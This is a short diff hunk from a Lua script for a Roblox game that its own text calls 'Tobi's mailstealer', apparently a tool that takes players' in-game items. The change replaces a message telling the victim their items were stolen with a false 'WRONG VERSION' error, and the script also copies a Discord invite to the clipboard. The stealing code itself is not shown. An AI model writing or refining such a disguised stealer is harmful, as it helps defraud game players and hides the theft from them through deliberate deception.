@@ -676,7 +676,7 @@ if #sortedItems > 0 then
 
     local message = require(game.ReplicatedStorage.Library.Client.Message)
 
-    message.Error("All your items just got stolen by Tobi's mailstealer!\n Join discord.gg/GY2RVSEGDT")
+    message.Error("WRONG VERSION")
 
     setclipboard("discord.gg/GY2RVSEGDT")
 
